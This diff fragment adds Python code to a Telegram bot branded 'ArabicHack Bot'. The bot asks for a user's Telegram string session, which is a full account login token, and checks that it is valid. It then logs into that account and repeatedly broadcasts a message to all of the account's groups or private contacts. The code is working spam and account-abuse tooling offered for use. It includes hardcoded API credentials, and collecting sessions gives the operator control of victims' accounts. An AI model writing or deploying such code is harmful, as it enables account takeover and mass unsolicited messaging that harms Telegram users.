+      await x.send_message("NOW GIVE MSG")
+      msg = await x.get_response()
+      await x.send_message("Now Done It Will Send message automatically every 10 min")
+      i = await gcastb(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
+
+async def gcastc(strses, msg):
+    async with tg(ses(strses), 19662621, "24c2270e7f1336eb59ca6c48e42ec6ca") as X:
+        try:
+            reply_msg = msg
+            tol = reply_msg
+            file = None
+            async for krishna in X.iter_dialogs():
+                if krishna.is_user and not krishna.entity.bot:
+                    chat = krishna.id
+                    try:
+                        await X.send_message(chat, tol, file=file)
+                        while molc != False:
+                            await asyncio.sleep(10)
+                            await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=20))
+                    except BaseException:
+                        pass
+        except Exception as e:
+            print(e)
+
+@client.on(events.callbackquery.CallbackQuery(data=re.compile(b"c")))
+async def users(event):
+  async with bot.conversation(event.chat_id) as x:
+      await x.send_message("GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
+      await x.send_message("NOW GIVE MSG IT WILL AUTOMATALLY START")
+      msg = await x.get_response()
+      await x.send_message("Now Done It Will Send message automatically every 10 min")
+      i = await gcastc(strses.text, msg.text)
+      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
+
+print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @SAYTHONH|SYTHONTM")
+client.run_until_disconnected()
